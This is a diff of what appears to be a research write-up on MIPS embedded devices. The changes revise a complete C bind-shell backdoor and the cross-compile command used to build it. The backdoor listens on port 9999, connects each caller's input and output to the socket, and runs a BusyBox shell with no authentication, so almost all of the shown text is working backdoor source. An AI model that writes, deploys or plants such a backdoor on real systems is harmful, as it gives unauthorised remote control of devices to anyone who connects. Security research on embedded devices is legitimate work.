@@ -90,55 +90,71 @@ After identifying the deficiencies present in the original backdoor implementati
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <signal.h>
+#include <arpa/inet.h>
 
 #define SERVER_PORT 9999
 
-int main() {
+int main(void) {
     int serverfd, clientfd;
+    struct sockaddr_in serv_addr, cli_addr;
+    socklen_t cli_len = sizeof(cli_addr);
     pid_t pid;
-    socklen_t len;
-    struct sockaddr_in server, client;
-    char *banner = "[~] Bind Shell Ready\n";
-    char *args[] = { "/bin/sh", NULL };
 
-    signal(SIGCHLD, SIG_IGN); // avoid zombie
+    // Ignora i figli zombie
+    signal(SIGCHLD, SIG_IGN);
 
+    // Crea socket
     serverfd = socket(AF_INET, SOCK_STREAM, 0);
     if (serverfd < 0) return 1;
 
-    int yes = 1;
-    setsockopt(serverfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));
+    int opt = 1;
+    setsockopt(serverfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
 
-    memset(&server, 0, sizeof(server));
-    server.sin_family = AF_INET;
-    server.sin_port = htons(SERVER_PORT);
-    server.sin_addr.s_addr = INADDR_ANY;
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_addr.s_addr = INADDR_ANY;
+    serv_addr.sin_port = htons(SERVER_PORT);
 
-    if (bind(serverfd, (struct sockaddr *)&server, sizeof(server)) < 0)
+    if (bind(serverfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
         return 1;
 
     if (listen(serverfd, 5) < 0)
         return 1;
 
+    char *banner = "[+] Bind Shell Ready on port 9999 - Have fun!\n$ ";
+    char *shell[] = { "/bin/busybox", "sh", NULL };
+
     while (1) {
-        len = sizeof(client);
-        clientfd = accept(serverfd, (struct sockaddr *)&client, &len);
+        clientfd = accept(serverfd, (struct sockaddr *)&cli_addr, &cli_len);
         if (clientfd < 0) continue;
 
         pid = fork();
-        if (pid == 0) {
-            // child
+
+        if (pid < 0) {
+            close(clientfd);
+            continue;
+        }
+
+        if (pid == 0) {  // Processo figlio
+            close(serverfd);  // il figlio non ha bisogno del listening socket
+
+            // Invia banner
             write(clientfd, banner, strlen(banner));
 
+            // Redirigi stdin/stdout/stderr verso il socket
             dup2(clientfd, 0);
             dup2(clientfd, 1);
             dup2(clientfd, 2);
+            close(clientfd);  // non più necessario tenerlo aperto
 
-            execve("/bin/sh", args, (char *) 0);
-            exit(0);
+            // Esegui la shell corretta per BusyBox
+            execve("/bin/busybox", shell, NULL);
+
+            // Se fallisce
+            write(clientfd, "execve failed\n", 14);
+            exit(1);
         }
 
-        // parent cleanup
+        // Processo padre
         close(clientfd);
     }
 
@@ -170,7 +186,7 @@ source env.sh
 Researchers may need to adjust the `PATH` and `SYSROOT` variables according to their local filesystem layout.
 Once configured, compiling target‑architecture binaries becomes straightforward:
 ``` bash
-mipsel-linux-gcc -o backdoor backdoor.c
+mipsel-linux-gcc -o backdoor backdoor_V2.c
 ```
 and the resulting artifact can be examined with:
 ```bash
